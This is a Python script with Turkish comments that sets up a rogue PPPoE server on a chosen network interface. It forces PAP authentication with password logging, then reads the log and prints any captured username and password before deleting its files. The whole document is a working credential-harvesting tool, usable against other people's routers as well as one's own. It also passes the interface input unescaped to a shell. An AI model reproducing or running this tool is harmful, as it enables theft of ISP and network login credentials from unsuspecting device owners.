import os
import time
import re
import subprocess

# Renkli çıktılar için optimize edilmiş sınıf
class Colors:
    HEADER = '\033[95m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    DOTS = '\033[94m'  # Mavi renkli noktalar için


def check_pppoe_server():
    print(f"{Colors.HEADER}Checking if PPPoE server is installed...{Colors.ENDC}")
    try:
        subprocess.run(["pppoe-server", "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        print(f"{Colors.OKGREEN}PPPoE server is installed.{Colors.ENDC}")
    except FileNotFoundError:
        print(f"{Colors.FAIL}PPPoE server is not installed!{Colors.ENDC}")
        print(f"{Colors.WARNING}Attempting to install PPPoE server...{Colors.ENDC}")
        try:
            subprocess.run(["sudo", "apt-get", "install", "-y", "pppoe"], check=True)
            print(f"{Colors.OKGREEN}PPPoE server installed successfully!{Colors.ENDC}")
        except subprocess.CalledProcessError:
            print(f"{Colors.FAIL}Failed to install PPPoE server. Please install it manually.{Colors.ENDC}")
            exit(1)


def configure_pppoe_server():
    options_file = "/etc/ppp/pppoe-server-options"
    log_file = "/var/log/pppoe-server-log"

    with open(options_file, "w") as f:
        f.write(
            "require-pap\n"
            "login\n"
            "show-password\n"
            "debug\n"
            f"logfile {log_file}\n"
        )
    print(f"{Colors.OKGREEN}Configuration file created at {options_file}{Colors.ENDC}")
    return options_file, log_file


def start_pppoe_server(interface, options_file):
    print(f"{Colors.OKGREEN}Starting PPPoE server on interface: {interface}...{Colors.ENDC}")
    command = f"sudo pppoe-server -F -I {interface} -O {options_file}"
    process = subprocess.Popen(command, shell=True)
    time.sleep(2)
    print(f"{Colors.OKGREEN}PPPoE server started successfully!{Colors.ENDC}")
    return process


def wait_for_log_file(log_file):
    """
    Log dosyasının oluşturulmasını bekler.
    Sabit bir satırda "Waiting for log file" mesajını gösterir.
    """
    print(f"{Colors.WARNING}Waiting for log file to be created at {log_file}...{Colors.WARNING}", end='', flush=True)
    while not os.path.exists(log_file):
        print(f"{Colors.WARNING}.{Colors.ENDC}", end='', flush=True)  # Noktalar mavi renkte olacak
        time.sleep(1)
    print(f"\n{Colors.OKGREEN}Log file detected!{Colors.ENDC}")


def parse_log_file(log_file):
    print(f"{Colors.HEADER}Reading log file: {log_file}...{Colors.HEADER}")
    try:
        with open(log_file, "r") as f:
            while True:
                line = f.readline()
                if not line:
                    time.sleep(1)
                    continue

                # Kullanıcı adı ve şifreyi regex ile çıkar
                match = re.search(r'user="([^"]+)"\s+password="([^"]+)"', line)
                if match:
                    user = match.group(1)
                    password = match.group(2)
                    print(f"\n{Colors.BOLD}{Colors.OKGREEN}[Credentials Found]{Colors.ENDC}")
                    print(f"Kullanıcı Adı: {Colors.BOLD}{user}{Colors.ENDC}")
                    print(f"Parola: {Colors.BOLD}{password}{Colors.ENDC}")
                    return
    except FileNotFoundError:
        print(f"{Colors.FAIL}Log file not found: {log_file}{Colors.ENDC}")
    except KeyboardInterrupt:
        print(f"{Colors.WARNING}\nStopping log monitoring...{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}Error reading log file: {e}{Colors.ENDC}")


def cleanup(options_file, log_file):
    print(f"{Colors.WARNING}Cleaning up...{Colors.ENDC}")
    try:
        if os.path.exists(options_file):
            os.remove(options_file)
            print(f"{Colors.OKGREEN}Deleted: {options_file}{Colors.ENDC}")
        if os.path.exists(log_file):
            os.remove(log_file)
            print(f"{Colors.OKGREEN}Deleted: {log_file}{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}Error during cleanup: {e}{Colors.ENDC}")


if __name__ == "__main__":
    try:
        check_pppoe_server()
        interface = input(f"{Colors.OKGREEN}Enter the network interface (e.g., eth1): {Colors.ENDC}")
        options_file, log_file = configure_pppoe_server()
        process = start_pppoe_server(interface, options_file)
        wait_for_log_file(log_file)
        parse_log_file(log_file)
    except KeyboardInterrupt:
        print(f"{Colors.WARNING}\nProcess interrupted by user.{Colors.ENDC}")
    finally:
        if 'process' in locals() and process:
            process.terminate()
            print(f"{Colors.FAIL}PPPoE server stopped.{Colors.ENDC}")
        cleanup(options_file, log_file)
